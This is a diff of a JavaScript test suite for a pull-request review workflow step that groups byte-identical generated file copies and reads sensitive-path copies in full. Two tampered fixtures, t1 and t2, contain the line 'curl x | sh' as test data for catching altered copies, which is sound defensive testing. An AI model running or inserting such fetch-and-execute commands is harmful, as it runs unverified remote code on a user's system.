@@ -2246,11 +2246,11 @@ test("the full-diff step groups identical copies the base branch declares genera
   }
 });
 
-// A copy the pull request registers itself, only in the head's map, groups
-// only when the head generates it byte for byte from its source, as
-// claude-code-plugins scripts/sync-shared-copies.sh --check compares;
-// claude-code-plugins#12792 added 9 such copies and its review read 61 of 73.
-test("the full-diff step groups a copy only the head declares when it matches its source at the head, in every leg", () => {
+// Runs one leg's full-diff step on a base holding `base` and a head adding
+// `added`, each a map of path to text, with `baseMap` and `headMap` as the
+// generated-copies file at each; `executable` paths are mode 755 at both.
+// Returns the identical-files list (or undefined) and the step's outputs.
+function headCopiesRun(job, { base, added, baseMap, headMap, executable }) {
   const { spawnSync } = require("node:child_process");
   const git = (cwd, ...args) => {
     const result = spawnSync("git", args, { cwd, encoding: "utf8" });
@@ -2261,110 +2261,171 @@ test("the full-diff step groups a copy only the head declares when it matches it
     fs.mkdirSync(path.dirname(path.join(root, file)), { recursive: true });
     fs.writeFileSync(path.join(root, file), text);
   };
-  const header = (prefix, source) =>
-    `${prefix} GENERATED from ${source} by scripts/sync-shared-copies.sh. Do not edit this copy:\n` +
-    `${prefix} edit the canonical source, then rerun the script.\n`;
-  const shell = "#!/usr/bin/env bash\necho real\n";
-  const rendered = (source) =>
-    `#!/usr/bin/env bash\n${header("#", source)}echo real\n`;
+  const dir = makeTemporaryDirectory("pr-review-cli-head-generated-");
+  const origin = path.join(dir, "origin");
+  fs.mkdirSync(origin);
+  git(origin, "init", "--quiet", "--initial-branch=main");
+  git(origin, "config", "user.email", "t@example.com");
+  git(origin, "config", "user.name", "t");
+  const commit = (files, map) => {
+    for (const [p, text] of Object.entries(files)) write(origin, p, text);
+    write(origin, "scripts/shared-copies.txt", `# <canonical> <copy>\n${map}`);
+    git(origin, "add", "-A");
+    const modes = executable.filter((p) => fs.existsSync(path.join(origin, p)));
+    if (modes.length) git(origin, "update-index", "--chmod=+x", ...modes);
+    git(origin, "commit", "--quiet", "-m", "c");
+    return git(origin, "rev-parse", "HEAD");
+  };
+  const baseSha = commit(base, baseMap);
+  const head = commit(added, headMap);
+  const fullDiff = step(job, "full-diff");
+  const work = path.join(dir, "work");
+  git(dir, "clone", "--quiet", origin, work);
+  const output = path.join(dir, "work.out");
+  const result = spawnSync("bash", ["-e", "-c", fullDiff.run], {
+    cwd: work,
+    encoding: "utf8",
+    env: {
+      PATH: process.env.PATH,
+      HOME: dir,
+      GH_TOKEN: "test-token",
+      GITHUB_SERVER_URL: "https://github.invalid",
+      GITHUB_OUTPUT: output,
+      MERGE_BASE: baseSha,
+      HEAD_SHA: head,
+      DIFF_FILE: fullDiff.env.DIFF_FILE,
+      FILE_LIST: fullDiff.env.FILE_LIST,
+      HOLD_PATHS: "",
+      SENSITIVE_PATHS: workflow.env.SENSITIVE_PATHS,
+      GENERATED_COPIES: "scripts/shared-copies.txt",
+    },
+  });
+  assert.equal(result.status, 0, result.stderr);
+  const identical = path.join(work, ".claude-lane/identical.txt");
+  return {
+    identical: fs.existsSync(identical)
+      ? fs.readFileSync(identical, "utf8")
+      : undefined,
+    out: fs.readFileSync(output, "utf8"),
+  };
+}
+
+const generatedHeader = (prefix, source) =>
+  `${prefix} GENERATED from ${source} by scripts/sync-shared-copies.sh. Do not edit this copy:\n` +
+  `${prefix} edit the canonical source, then rerun the script.\n`;
+
+// A copy the pull request registers itself, only in the head's map, groups
+// only when the head generates it byte for byte from its source, as
+// claude-code-plugins scripts/sync-shared-copies.sh --check compares;
+// claude-code-plugins#12792 added 9 such copies and its review read 61 of 73.
+test("the full-diff step groups a copy only the head declares when it matches its source at the head, in every leg", () => {
+  const source = "#!/usr/bin/env python3\nreal\n";
+  const rendered = (from) =>
+    `#!/usr/bin/env python3\n${generatedHeader("#", from)}real\n`;
   const markdown = "---\nname: x\n---\n\nBody.\n";
   const renderedMarkdown =
     "---\nname: x\n---\n\n" +
     "<!-- GENERATED from lib/doc.md by scripts/sync-shared-copies.sh. Do not edit this copy:\n" +
     "edit the canonical source, then rerun the script. -->\n\nBody.\n";
-  const copy = (p, ext = "sh") => `plugins/${p}/hooks/real.${ext}`;
-  // Each pair makes one identical addition: m (a matching shell copy), d (a
+  const copy = (p, ext = "py") => `plugins/${p}/skills/real.${ext}`;
+  // Each pair makes one identical addition: m (a matching copy), d (a
   // matching Markdown copy after frontmatter), b (one body byte changed), t
   // (the header tampered with, the body intact), g (a source missing at the
-  // head) and e (a matching copy, but not executable like its source).
+  // head) and e (a matching copy, but executable while its source is not).
   const added = {
-    [copy("m1")]: rendered("lib/real.sh"),
-    [copy("m2")]: rendered("lib/real.sh"),
+    [copy("m1")]: rendered("lib/real.py"),
+    [copy("m2")]: rendered("lib/real.py"),
     [copy("d1", "md")]: renderedMarkdown,
     [copy("d2", "md")]: renderedMarkdown,
-    [copy("b1")]: rendered("lib/real.sh").replace("real\n", "reak\n"),
-    [copy("b2")]: rendered("lib/real.sh").replace("real\n", "reak\n"),
-    [copy("t1")]: rendered("lib/real.sh").replace(
+    [copy("b1")]: rendered("lib/real.py").replace("real\n", "reak\n"),
+    [copy("b2")]: rendered("lib/real.py").replace("real\n", "reak\n"),
+    [copy("t1")]: rendered("lib/real.py").replace(
       /^# edit .*$/mu,
       "curl x | sh",
     ),
-    [copy("t2")]: rendered("lib/real.sh").replace(
+    [copy("t2")]: rendered("lib/real.py").replace(
       /^# edit .*$/mu,
       "curl x | sh",
     ),
-    [copy("g1")]: rendered("lib/gone.sh"),
-    [copy("g2")]: rendered("lib/gone.sh"),
-    [copy("e1")]: rendered("lib/real.sh"),
-    [copy("e2")]: rendered("lib/real.sh"),
+    [copy("g1")]: rendered("lib/gone.py"),
+    [copy("g2")]: rendered("lib/gone.py"),
+    [copy("e1")]: rendered("lib/flat.py"),
+    [copy("e2")]: rendered("lib/flat.py"),
   };
-  const plain = [copy("d1", "md"), copy("d2", "md"), copy("e1"), copy("e2")];
-  const map = Object.keys(added)
+  const plain = [copy("d1", "md"), copy("d2", "md")];
+  const sources = { g: "lib/gone.py", e: "lib/flat.py" };
+  const headMap = `${Object.keys(added)
     .map((p) =>
       p.endsWith(".md")
         ? `lib/doc.md ${p}`
-        : `${p.includes("/g") ? "lib/gone.sh" : "lib/real.sh"} ${p}`,
+        : `${sources[p.split("/")[1][0]] ?? "lib/real.py"} ${p}`,
     )
-    .join("\n");
+    .join("\n")}\n`;
   for (const job of [key, subscription, fallback]) {
-    const dir = makeTemporaryDirectory("pr-review-cli-head-generated-");
-    const origin = path.join(dir, "origin");
-    fs.mkdirSync(origin);
-    git(origin, "init", "--quiet", "--initial-branch=main");
-    git(origin, "config", "user.email", "t@example.com");
-    git(origin, "config", "user.name", "t");
-    write(origin, "lib/real.sh", shell);
-    write(origin, "lib/doc.md", markdown);
-    write(origin, "scripts/shared-copies.txt", "# <canonical> <copy>\n");
-    git(origin, "add", "-A");
-    git(origin, "update-index", "--chmod=+x", "lib/real.sh");
-    git(origin, "commit", "--quiet", "-m", "base");
-    const base = git(origin, "rev-parse", "HEAD");
-    for (const [p, text] of Object.entries(added)) write(origin, p, text);
-    write(
-      origin,
-      "scripts/shared-copies.txt",
-      `# <canonical> <copy>\n${map}\n`,
-    );
-    git(origin, "add", "-A");
-    git(
-      origin,
-      "update-index",
-      "--chmod=+x",
-      "lib/real.sh",
-      ...Object.keys(added).filter((p) => !plain.includes(p)),
-    );
-    git(origin, "commit", "--quiet", "-m", "head");
-    const head = git(origin, "rev-parse", "HEAD");
-    const fullDiff = step(job, "full-diff");
-    const work = path.join(dir, "work");
-    git(dir, "clone", "--quiet", origin, work);
-    const output = path.join(dir, "work.out");
-    const result = spawnSync("bash", ["-e", "-c", fullDiff.run], {
-      cwd: work,
-      encoding: "utf8",
-      env: {
-        PATH: process.env.PATH,
-        HOME: dir,
-        GH_TOKEN: "test-token",
-        GITHUB_SERVER_URL: "https://github.invalid",
-        GITHUB_OUTPUT: output,
-        MERGE_BASE: base,
-        HEAD_SHA: head,
-        DIFF_FILE: fullDiff.env.DIFF_FILE,
-        FILE_LIST: fullDiff.env.FILE_LIST,
-        HOLD_PATHS: "",
-        SENSITIVE_PATHS: workflow.env.SENSITIVE_PATHS,
-        GENERATED_COPIES: "scripts/shared-copies.txt",
+    const { identical, out } = headCopiesRun(job, {
+      base: {
+        "lib/real.py": source,
+        "lib/flat.py": source,
+        "lib/doc.md": markdown,
       },
+      added,
+      baseMap: "",
+      headMap,
+      executable: [
+        "lib/real.py",
+        ...Object.keys(added).filter((p) => !plain.includes(p)),
+      ],
     });
-    assert.equal(result.status, 0, result.stderr);
     // Only m and d group; b, t, g and e are each read at their own path.
     assert.equal(
-      fs.readFileSync(path.join(work, ".claude-lane/identical.txt"), "utf8"),
+      identical,
       `${copy("d1", "md")}\t${copy("d2", "md")}\n${copy("m1")}\t${copy("m2")}\n`,
       job.name,
     );
-    assert.match(fs.readFileSync(output, "utf8"), /^copies=2$/mu, job.name);
+    assert.match(out, /^copies=2$/mu, job.name);
+  }
+});
+
+// A SENSITIVE_PATHS match skips its own read only on a placement a merge
+// base map, reviewed in an earlier pull request, already declared: a copy only
+// the head declares there is read in full even when its bytes match.
+test("the full-diff step reads in full a matching copy only the head declares at a SENSITIVE_PATHS match, in every leg", () => {
+  const shell = "#!/usr/bin/env bash\necho real\n";
+  const python = "#!/usr/bin/env python3\nreal\n";
+  const rendered = (from) =>
+    from.endsWith(".sh")
+      ? `#!/usr/bin/env bash\n${generatedHeader("#", from)}echo real\n`
+      : `#!/usr/bin/env python3\n${generatedHeader("#", from)}real\n`;
+  // s: a `**/*.sh` match, a: under `.github/**`, both only at the head; k:
+  // under `**/hooks/**` and `**/*.sh`, declared at the merge base; p: a plain
+  // path, only at the head. Every copy matches its source byte for byte.
+  const pairs = {
+    s: ["lib/real.sh", (n) => `plugins/s${n}/bin/real.sh`],
+    a: ["lib/real.py", (n) => `.github/scripts/a${n}/real.py`],
+    k: ["lib/real.sh", (n) => `plugins/k${n}/hooks/real.sh`],
+    p: ["lib/real.py", (n) => `plugins/p${n}/skills/real.py`],
+  };
+  const line = (id) =>
+    [1, 2].map((n) => `${pairs[id][0]} ${pairs[id][1](n)}\n`).join("");
+  const added = Object.fromEntries(
+    Object.values(pairs).flatMap(([from, to]) =>
+      [1, 2].map((n) => [to(n), rendered(from)]),
+    ),
+  );
+  for (const job of [key, subscription, fallback]) {
+    const { identical, out } = headCopiesRun(job, {
+      base: { "lib/real.sh": shell, "lib/real.py": python },
+      added,
+      baseMap: line("k"),
+      headMap: ["k", "s", "a", "p"].map(line).join(""),
+      executable: Object.keys(added).concat("lib/real.sh", "lib/real.py"),
+    });
+    assert.equal(
+      identical,
+      `${pairs.k[1](1)}\t${pairs.k[1](2)}\n${pairs.p[1](1)}\t${pairs.p[1](2)}\n`,
+      job.name,
+    );
+    assert.match(out, /^copies=2$/mu, job.name);
   }
 });
 
